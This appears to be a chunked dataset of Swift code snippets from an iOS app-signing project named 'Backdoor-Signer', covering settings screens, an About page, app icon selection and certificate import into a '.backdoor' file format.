2725,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningSettingsCell.swift","Function configure - implements configure functionality","func configure(title: String, description: String, isOn: Bool, status: String = """") {
titleLabel.text = title
descriptionLabel.text = description
toggleSwitch.isOn = isOn
statusLabel.text = status

// Hide status label if empty
statusLabel.isHidden = status.isEmpty
}
"
2726,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningSettingsCell.swift","Function switchToggled - implements switchtoggled functionality","@objc private func switchToggled() {
toggleAction?(toggleSwitch.isOn)
}
}
"
2727,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","/ View controller for improved AI learning settings","class ImprovedLearningViewController: UIViewController {
// UI Elements
private let tableView = UITableView(frame: .zero, style: .insetGrouped)
private let headerView = UIView()
private let headerLabel = UILabel()
private let trainButton = UIButton(type: .system)
private let activityIndicator = UIActivityIndicatorView(style: .medium)

// Settings sections
private enum Section: Int, CaseIterable {"
2728,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","Settings sections","private enum Section: Int, CaseIterable {
case main
case learning
case upload
}

override func viewDidLoad() {"
2729,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()

title = ""Advanced AI Learning""
view.backgroundColor = UIColor(named: ""SettingsBackground"") ?? .systemGroupedBackground

setupUI()

// Apply the overrides to ensure AI learns from ALL interactions
AILearningManager.shared.applyAllInteractionTrainingOverrides()"
2730,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)

// Refresh the table view
tableView.reloadData()

// Update the stats header
updateStatsHeader()
}
"
2731,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","Function setupUI - sets upui","private func setupUI() {
// Configure table view
tableView.delegate = self
tableView.dataSource = self
tableView.backgroundColor = .clear
tableView.register(ImprovedLearningSettingsCell.self, forCellReuseIdentifier: ""SettingsCell"")
tableView.register(UITableViewCell.self, forCellReuseIdentifier: ""DefaultCell"")

// Configure header view
headerLabel.font = .systemFont(ofSize: 14)"
2732,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","Function updateStatsHeader - updates statsheader","private func updateStatsHeader() {
// Get learning statistics
let stats = AILearningManager.shared.getLearningStatistics()

// Format date
let dateFormatter = DateFormatter()
dateFormatter.dateStyle = .medium
dateFormatter.timeStyle = .short
let lastTrainingText = stats.lastTrainingDate != nil ?
dateFormatter.string(from: stats.lastTrainingDate!) : ""Never"""
2733,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","Function trainButtonPressed - implements trainbuttonpressed functionality","@objc private func trainButtonPressed() {
// Disable button and show activity indicator
trainButton.isEnabled = false
activityIndicator.startAnimating()

// Train model with all interactions
AILearningManager.shared.trainModelWithAllInteractionsNow { [weak self] success, message in"
2734,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","MARK: - UITableViewDelegate & UITableViewDataSource","extension ImprovedLearningViewController: UITableViewDelegate, UITableViewDataSource {
func numberOfSections(in _: UITableView) -> Int {"
2735,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","Function numberOfSections - implements numberofsections functionality","func numberOfSections(in _: UITableView) -> Int {
return Section.allCases.count
}

func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {"
2736,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, numberOfRowsInSection section: Int) -> Int {
switch Section(rawValue: section) {"
2737,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
guard let section = Section(rawValue: indexPath.section) else {"
2738,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, titleForHeaderInSection section: Int) -> String? {
guard let section = Section(rawValue: section) else {"
2739,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","Function tableView - implements tableview functionality","func tableView(_: UITableView, titleForFooterInSection section: Int) -> String? {
guard let section = Section(rawValue: section) else {"
2740,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ImprovedLearningViewController.swift","Function tableView - implements tableview functionality","func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
tableView.deselectRow(at: indexPath, animated: true)

guard let section = Section(rawValue: indexPath.section) else {"
2741,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController+SafeAsync.swift","/ Extension to ensure proper async/await usage in view controllers","extension ModelServerIntegrationViewController {
/// Safe wrapper for async tasks that ensures proper await usage
func performAsyncSafely(_ task: @escaping () async -> Void) {"
2742,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController+SafeAsync.swift","/ Safe wrapper for async tasks that ensures proper await usage","func performAsyncSafely(_ task: @escaping () async -> Void) {
Task {"
2743,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController+SafeAsync.swift","/ Safe method to check server status with proper async/await handling","func checkServerStatusSafely() {
performAsyncSafely { [weak self] in"
2744,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController+SafeAsync.swift","/ Updates the server status UI using the public method instead of direct label access","private func updateServerStatusUI(status: String, message: String, isError: Bool) {
let statusText = ""Server status: \(status)\n\(message)""
updateStatusLabel(text: statusText, isError: isError)
}

/// Updates the UI status label with the provided text and styling
func updateStatusLabel(text: String, isError: Bool) {"
2745,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController+SafeAsync.swift","/ Updates the UI status label with the provided text and styling","func updateStatusLabel(text: String, isError: Bool) {
DispatchQueue.main.async { [weak self] in"
2746,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController+SafeAsync.swift","/ Safe wrapper for model uploads using proper async/await","func uploadModelSafely(completion: @escaping (Bool, String) -> Void) {
performAsyncSafely {"
2747,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift","/ View controller for integrating with the AI server, including model upload","class ModelServerIntegrationViewController: UIViewController {
// UI Elements
private let scrollView = UIScrollView()
private let contentView = UIView()
private let serverSyncSwitch = UISwitch()
private let uploadModelButton = UIButton(type: .system)
private let statusLabel = UILabel()
private let activityIndicator = UIActivityIndicatorView(style: .medium)
private let lastUploadLabel = UILabel()
private let modelInfoLabel = UILabel()"
2748,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()

title = ""AI Server Integration""
view.backgroundColor = UIColor(named: ""Background"") ?? .systemBackground

setupUI()
updateStatus()
}
"
2749,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift","Function viewWillAppear - implements viewwillappear functionality","override func viewWillAppear(_ animated: Bool) {
super.viewWillAppear(animated)
updateStatus()
}

private func setupUI() {"
2750,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift","Function setupUI - sets upui","private func setupUI() {
// Setup scroll view
scrollView.translatesAutoresizingMaskIntoConstraints = false
contentView.translatesAutoresizingMaskIntoConstraints = false
view.addSubview(scrollView)
scrollView.addSubview(contentView)

NSLayoutConstraint.activate([
scrollView.topAnchor.constraint(equalTo: view.safeAreaLayoutGuide.topAnchor),
scrollView.leadingAnchor.constraint(equalTo: view.leadingAnchor),"
2751,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift","Function updateStatus - updates status","private func updateStatus() {
let isServerSyncEnabled = AILearningManager.shared.isServerSyncEnabled
serverSyncSwitch.isOn = isServerSyncEnabled

// Update UI based on server sync status
if isServerSyncEnabled {"
2752,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift","Function serverSyncSwitchChanged - implements serversyncswitchchanged functionality","@objc private func serverSyncSwitchChanged() {
// Update the server sync setting
AILearningManager.shared.setServerSyncEnabled(serverSyncSwitch.isOn)

// Update UI
updateStatus()
}

@objc private func uploadModelButtonTapped() {"
2753,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AI Learning/ModelServerIntegrationViewController.swift","Function uploadModelButtonTapped - implements uploadmodelbuttontapped functionality","@objc private func uploadModelButtonTapped() {
// Disable UI during upload
uploadModelButton.isEnabled = false
activityIndicator.startAnimating()
statusLabel.text = ""Uploading model to server...""
statusLabel.textColor = .systemOrange

// Upload the model using safe wrapper
uploadModelSafely { [weak self] success, message in"
2754,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift","class AboutViewController - Controls user interface and application flow","class AboutViewController: FRSTableViewController {
var credits: [CreditsPerson] = []
var creditsSponsors: [CreditsPerson] = []
var fileNames: [String] = []

private let sourceGET = SourceGET()

override func viewDidLoad() {"
2755,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()

tableData = [
[""Header""],
[],
["""", ""Thanks""], // Don't translate this
[],
]
"
2756,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift","Function setupNavigation - sets upnavigation","fileprivate func setupNavigation() {
title = ""About""
navigationItem.rightBarButtonItem = UIBarButtonItem(
barButtonSystemItem: .action,
target: self,
action: #selector(shareButtonTapped)
)
}

fileprivate func setupCreditsSection() {"
2757,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift","Function setupCreditsSection - sets upcreditssection","fileprivate func setupCreditsSection() {
if let mdFiles = try? FileManager.default.contentsOfDirectory(atPath: Bundle.main.bundlePath)
.filter({ $0.hasSuffix("".md"") })"
2758,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift","Function getURL - retrieves url","private func getURL(url: URL, completion: @escaping (Result<[CreditsPerson], Error>) -> Void) {
sourceGET.downloadURL(from: url) { result in"
2759,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift","Function shareButtonTapped - implements sharebuttontapped functionality","@objc func shareButtonTapped() {
let shareText = ""Backdoor - https://github.com/khcrysalis/backdoor""
let activityViewController = UIActivityViewController(activityItems: [shareText], applicationActivities: nil)

if let popoverController = activityViewController.popoverPresentationController {"
2760,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift","extension AboutViewController - Controls user interface and application flow","extension AboutViewController {
override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
2761,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let reuseIdentifier = ""Cell""
let cell = UITableViewCell(style: .value1, reuseIdentifier: reuseIdentifier)
cell.accessoryType = .none
cell.selectionStyle = .none

let cellText = tableData[indexPath.section][indexPath.row]

switch indexPath.section {"
2762,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
let selectedFileName = tableData[indexPath.section][indexPath.row]
switch indexPath.section {"
2763,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift","extension AboutViewController - Controls user interface and application flow","extension AboutViewController {
private func loadFileContents(fileName: String) -> String? {"
2764,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/AboutViewController.swift","Function loadFileContents - implements loadfilecontents functionality","private func loadFileContents(fileName: String) -> String? {
guard let filePath = Bundle.main.path(forResource: fileName, ofType: """"),
let fileContents = try? String(contentsOfFile: filePath)
else {"
2765,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/LicenseViewController.swift","class LicenseViewController - Controls user interface and application flow","class LicenseViewController: UIViewController {
var textContent: String?
var titleText: String?

override func viewDidLoad() {"
2766,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/LicenseViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
title = titleText
let textView = UITextView()
textView.text = textContent
textView.isEditable = false
textView.translatesAutoresizingMaskIntoConstraints = false

let monospacedFont = UIFont.monospacedSystemFont(ofSize: 12.0, weight: .regular)
textView.font = monospacedFont"
2767,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift","struct CreditsPerson - implements functionality related to credits person","struct CreditsPerson: Codable {
let name: String?
let desc: String?
let github: String
}

class PersonCell: UITableViewCell {"
2768,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift","class PersonCell - implements functionality related to person cell","class PersonCell: UITableViewCell {
var personImageView: UIImageView = {"
2769,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift","Function configure - implements configure functionality","func configure(with person: CreditsPerson) {
nameLabel.text = person.name ?? person.github
roleLabel.text = person.desc ?? person.github

URLSession.shared.dataTask(with: URL(string: ""https://github.com/\(person.github).png"")!) { data, _, _ in"
2770,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift","Function setupViews - sets upviews","private func setupViews() {
contentView.addSubview(personImageView)
contentView.addSubview(nameLabel)
contentView.addSubview(roleLabel)

NSLayoutConstraint.activate([
personImageView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 16),
personImageView.centerYAnchor.constraint(equalTo: contentView.centerYAnchor),
personImageView.widthAnchor.constraint(equalToConstant: 45),
personImageView.heightAnchor.constraint(equalToConstant: 45),"
2771,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift","class BatchPersonCell - implements functionality related to batch person cell","class BatchPersonCell: UITableViewCell {
private let textView: UITextView = {"
2772,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift","Function configure - implements configure functionality","func configure(with persons: [CreditsPerson]) {
let attributedText = NSMutableAttributedString()

for (index, person) in persons.enumerated() {"
2773,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsCreditsTableCell.swift","Function setupViews - sets upviews","private func setupViews() {
contentView.addSubview(textView)

NSLayoutConstraint.activate([
textView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 16),
textView.trailingAnchor.constraint(equalTo: contentView.trailingAnchor, constant: -16),
textView.topAnchor.constraint(equalTo: contentView.topAnchor, constant: 8),
textView.bottomAnchor.constraint(equalTo: contentView.bottomAnchor, constant: -8),
])
}"
2774,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsHeaderTableViewCell.swift","class SettingsHeaderTableViewCell - implements functionality related to settings header table view cell","class SettingsHeaderTableViewCell: UITableViewCell {
let titleLabel = UILabel()
let versionLabel = UILabel()

override init(style: UITableViewCell.CellStyle, reuseIdentifier: String?) {"
2775,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsHeaderTableViewCell.swift","Function setupViews - sets upviews","private func setupViews() {
contentView.addSubview(titleLabel)
contentView.addSubview(versionLabel)

titleLabel.translatesAutoresizingMaskIntoConstraints = false
versionLabel.translatesAutoresizingMaskIntoConstraints = false

titleLabel.font = UIFont.boldSystemFont(ofSize: 22)
titleLabel.textColor = UIColor.label
"
2776,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/About/SettingsHeaderTableViewCell.swift","Function configure - implements configure functionality","func configure(withTitle title: String, versionString: String) {
titleLabel.text = title.capitalized
versionLabel.text = versionString
}
}
"
2777,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListTableViewCell.swift","class IconsListTableViewCell - implements functionality related to icons list table view cell","class IconsListTableViewCell: UITableViewCell {
private let iconView: UIImageView = {"
2778,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListTableViewCell.swift","Function setupViews - sets upviews","private func setupViews() {
contentView.addSubview(iconView)
contentView.addSubview(iconName)
contentView.addSubview(author)

NSLayoutConstraint.activate([
iconView.leadingAnchor.constraint(equalTo: contentView.leadingAnchor, constant: 17.5),
iconView.centerYAnchor.constraint(equalTo: contentView.centerYAnchor),
iconView.widthAnchor.constraint(equalToConstant: 52),
iconView.heightAnchor.constraint(equalToConstant: 52),"
2779,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","class IconsListViewController - Controls user interface and application flow","class IconsListViewController: UITableViewController {
class func altImage(_ name: String) -> UIImage {"
2780,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","class func - implements func functionality","class func altImage(_ name: String) -> UIImage {
// Try multiple locations for the icon image (root first for backward compatibility)
let possiblePaths: [URL] = [
// Check root of bundle (original implementation)
Bundle.main.bundleURL.appendingPathComponent(name + ""@2x.png""),

// Check Main folder for Main icons
Bundle.main.bundleURL.appendingPathComponent(""Icons/Main/\(name)@2x.png""),

// Check Wing folder for Wing icon"
2781,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
setupViews()
setupNavigation()
}

fileprivate func setupViews() {"
2782,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","Function setupViews - sets upviews","fileprivate func setupViews() {
tableView.delegate = self
tableView.dataSource = self
tableView.rowHeight = 75
}

fileprivate func setupNavigation() {"
2783,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","Function setupNavigation - sets upnavigation","fileprivate func setupNavigation() {
title = String.localized(""SETTINGS_VIEW_CONTROLLER_CELL_APP_ICON"")
navigationItem.largeTitleDisplayMode = .never
}

private func sectionTitles() -> [String] {"
2784,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","Function sectionTitles - implements sectiontitles functionality","private func sectionTitles() -> [String] {
return Array(sections.keys).sorted()
}

private func icons(forSection section: Int) -> [AltIcon] {"
2785,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","Function icons - implements icons functionality","private func icons(forSection section: Int) -> [AltIcon] {
let title = sectionTitles()[section]
return sections[title] ?? []
}
}

extension IconsListViewController {"
2786,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","extension IconsListViewController - Controls user interface and application flow","extension IconsListViewController {
override func numberOfSections(in _: UITableView) -> Int { return sectionTitles().count }"
2787,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","Function numberOfSections - implements numberofsections functionality","override func numberOfSections(in _: UITableView) -> Int { return sectionTitles().count }
override func tableView(_: UITableView,
numberOfRowsInSection section: Int) -> Int { return icons(forSection: section).count }"
2788,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView,
numberOfRowsInSection section: Int) -> Int { return icons(forSection: section).count }"
2789,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, heightForHeaderInSection _: Int) -> CGFloat { return 40 }

override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {"
2790,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, viewForHeaderInSection section: Int) -> UIView? {
let title = sectionTitles()[section]
return InsetGroupedSectionHeader(title: title)
}

override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {"
2791,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","Function tableView - implements tableview functionality","override func tableView(_: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
let cell = IconsListTableViewCell()
let icon = icons(forSection: indexPath.section)[indexPath.row]
cell.altIcon = icon
if UIApplication.shared.alternateIconName == icon.key {"
2792,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","Function tableView - implements tableview functionality","override func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
tableView.deselectRow(at: indexPath, animated: true)
let icon = icons(forSection: indexPath.section)[indexPath.row]

// Store current selection for UI updates even if async call hasn't completed
let selectedIconKey = icon.key

// Show activity indicator
let activityIndicator = UIActivityIndicatorView(style: .medium)
activityIndicator.startAnimating()"
2793,swift,iOS,extension,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","extension UIImage - implements functionality related to u i image","extension UIImage {
// Helper to check if an image is empty
var isEmpty: Bool {"
2794,swift,iOS,struct,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/AppIcon/IconsListViewController.swift","struct AltIcon - implements functionality related to alt icon","struct AltIcon {
var displayName: String
var author: String
var key: String?
var image: UIImage
}
"
2795,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/BackdoorConverter.swift","/ Utility class to create backdoor files from separate p12 and mobileprovision files","class BackdoorConverter {
/// Error types that can occur during backdoor file creation
enum Error: Swift.Error {"
2796,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/BackdoorConverter.swift","/ Error types that can occur during backdoor file creation","enum Error: Swift.Error {
case p12ImportFailed
case noIdentity
case keyOrCertMissing
case signatureFailed(CFError?)
case fileAccessError(Swift.Error)
case fileWriteError(Swift.Error)
case encryptionFailed
}
"
2797,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/BackdoorConverter.swift","/ Creates a backdoor file from separate p12 and mobileprovision files / - Parameters: /   - p12URL: URL to the p12 file /   - mobileProvisionURL: URL to the mobileprovision file /   - outputURL: URL where the backdoor file should be saved /   - p12Password: Optional password for the p12 file /   - encrypt: Whether to encrypt the sensitive data (default: true)","static func createBackdoorFile(
p12URL: URL,
mobileProvisionURL: URL,
outputURL: URL,
p12Password: String? = nil,
encrypt: Bool = true
) throws {"
2798,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/BackdoorConverter.swift","/ Creates an encrypted .backdoor file from raw certificate data / - Parameters: /   - p12Data: The raw p12 certificate data /   - mobileProvisionData: The raw mobileprovision data /   - privateKey: The private key to use for signing /   - certificate: The certificate associated with the private key /   - outputURL: URL where the backdoor file should be saved","static func createBackdoorFileFromData(
p12Data: Data,
mobileProvisionData: Data,
privateKey: SecKey,
certificate: SecCertificate,
outputURL: URL,
encrypt: Bool = true
) throws {"
2799,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function provision_file_validation - implements provision file validation functionality","func provision_file_validation(_ path: String)

@_silgen_name(""p12_password_check"")
func p12_password_check(_ path: String, _ password: String) -> Bool

class CertImportingViewController: UITableViewController {"
2800,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function p12_password_check - implements p12 password check functionality","func p12_password_check(_ path: String, _ password: String) -> Bool

class CertImportingViewController: UITableViewController {"
2801,swift,iOS,class,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","class CertImportingViewController - Controls user interface and application flow","class CertImportingViewController: UITableViewController {
lazy var saveButton = UIBarButtonItem(
title: String.localized(""SAVE""),
style: .plain,
target: self,
action: #selector(saveAction)
)
private var passwordTextField: UITextField?
private var backdoorFile: BackdoorFile?
"
2802,swift,iOS,enum,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","enum FileType - implements functionality related to file type","enum FileType: Hashable {
case provision
case p12
case password
case backdoor
}

var sectionData = [
""backdoor"",
""provision"","
2803,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function viewDidLoad - implements viewdidload functionality","override func viewDidLoad() {
super.viewDidLoad()
setupNavigation()
setupViews()
}

fileprivate func setupViews() {"
2804,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function setupViews - sets upviews","fileprivate func setupViews() {
self.tableView.dataSource = self
self.tableView.delegate = self
}

fileprivate func setupNavigation() {"
2805,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function setupNavigation - sets upnavigation","fileprivate func setupNavigation() {
self.navigationItem.largeTitleDisplayMode = .never
self.title = String.localized(""CERT_IMPORTING_VIEWCONTROLLER_TITLE"")
saveButton.isEnabled = false
self.navigationItem.rightBarButtonItem = saveButton
self.navigationItem.leftBarButtonItem = UIBarButtonItem(
title: String.localized(""DISMISS""),
style: .done,
target: self,
action: #selector(closeSheet)"
2806,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function closeSheet - implements closesheet functionality","@objc func closeSheet() {
dismiss(animated: true, completion: nil)
}

@objc func saveAction() {"
2807,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function saveAction - implements saveaction functionality","@objc func saveAction() {
// Check if we have a backdoor file
if let backdoorFile = self.backdoorFile {"
2808,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","/ Creates a backdoor file from the currently selected p12 and mobileprovision files / - Parameters: /   - outputURL: Where to save the resulting backdoor file /   - encrypt: Whether to encrypt sensitive data in the file (default: true)","private func createBackdoorFileFromSelection(outputURL: URL, encrypt: Bool = true) throws {
guard let p12URL = selectedFiles[.p12] as? URL else {"
2809,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function textFieldDidChange - implements textfielddidchange functionality","@objc func textFieldDidChange(_ textField: UITextField) {
guard textField === passwordTextField else { return }"
2810,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function processBackdoorFile - implements processbackdoorfile functionality","private func processBackdoorFile(at url: URL) {
// First check if the file has a .backdoor extension or appears to be in backdoor format
if !BackdoorDecoder.isBackdoorFile(at: url) {"
2811,swift,iOS,function,"/workspace/build-it-test-it_Backdoor-Signer/iOS/Views/Settings/Certificates/CertImportingViewController.swift","Function showAlert - implements showalert functionality","private func showAlert(title: String, message: String) {
let alert = UIAlertController(title: title, message: message, preferredStyle: .alert)
